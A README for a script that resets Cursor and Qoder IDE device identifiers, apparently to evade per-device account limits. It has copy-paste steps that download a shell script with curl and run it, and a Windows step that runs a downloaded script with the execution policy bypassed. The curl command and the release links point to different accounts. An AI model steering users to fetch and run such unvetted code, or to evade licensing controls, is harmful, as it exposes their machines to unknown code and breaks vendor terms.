# 🖱️ cursor_fucked - Effortlessly Reset Cursor IDE Identifiers

[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Deathmaninthehood/cursor_fucked/releases)

## 🚀 Getting Started

Welcome to the cursor_fucked guide! This tool helps you reset the Cursor IDE device identifiers on macOS and Windows. You can create essential backups and quickly switch accounts without hassle.

## 📥 Download the Software

To get started, you need to download the software from our Releases page. Visit this link to download the latest version: [Download cursor_fucked](https://github.com/Deathmaninthehood/cursor_fucked/releases).

## 🖥️ Platform Support

- <img src="apple-logo.svg" width="16" height="16" alt="Apple"> **macOS**: Use `reset.sh` (bash script) - [Jump to macOS Guide](#macos-guide)
- <img src="windows-logo.svg" width="16" height="16" alt="Windows"> **Windows**: Use `reset.ps1` (PowerShell) - [Jump to Windows Guide](#windows-guide)

## ⚙️ What It Does

This tool provides several features to enhance your experience:

- ✅ Resets all device identifiers.
- ✅ Creates backups automatically for security.
- ✅ Includes functionality to restore previous settings.
- ✅ Handles code signing so you don't have to.
- ✅ Works seamlessly with Cursor and Qoder IDEs.

---

## <img src="apple-logo.svg" width="20" height="20" alt="Apple"> macOS Guide

### Requirements

Make sure your system meets these requirements:

- macOS 10.13 or higher
- Cursor IDE or Qoder IDE installed
- Access to the Terminal application

### Installation

Follow these steps to download and install the script on macOS.

#### Step 1: Download the Script

Open Terminal and enter the following command:

```bash
curl -fsSL https://raw.githubusercontent.com/AhmedAlNeaimy/cursor_fucked/refs/heads/main/reset.sh -o ~/cursor_fucked.sh
```

This command will download the script to your home directory.

#### Step 2: Make the Script Executable

Before running the script, you need to give it permission to execute. Run this command in the Terminal:

```bash
chmod +x ~/cursor_fucked.sh
```

#### Step 3: Run the Script

Now, you can run the script with this command:

```bash
~/cursor_fucked.sh
```

Follow the prompts on your screen. The tool will reset your device identifiers and create backups automatically.

---

## <img src="windows-logo.svg" width="20" height="20" alt="Windows"> Windows Guide

### Requirements

To use the tool on Windows, ensure you have:

- Windows 10 or later
- Cursor IDE or Qoder IDE installed
- PowerShell access

### Installation

Follow these steps to download and install the script on Windows.

#### Step 1: Download the Script

Go to the Releases page and download the script: [Download cursor_fucked](https://github.com/Deathmaninthehood/cursor_fucked/releases).

#### Step 2: Open PowerShell

Press `Win + X` and select "Windows PowerShell" or "Windows Terminal".

#### Step 3: Run the Script

In PowerShell, navigate to the directory where you saved the file. If you followed the default download path, use:

```powershell
cd ~\Downloads
```

Run the script using this command:

```powershell
powershell -ExecutionPolicy Bypass -File .\reset.ps1
```

Follow the instructions provided by the script. It will reset your device identifiers and create backups for safety. 

## ❓ Troubleshooting 

If you run into any issues:

1. Ensure you have the right permissions to run scripts.
2. Check if the required IDEs are installed correctly.
3. Review the logs for error messages.

## 📞 Support

For further assistance, please reach out through the Issues tab on our GitHub page. Your feedback is valued, and we aim to improve your experience.

---

Now you're ready to reset your Cursor IDE device identifiers with ease. Enjoy the flexibility of managing multiple accounts effortlessly!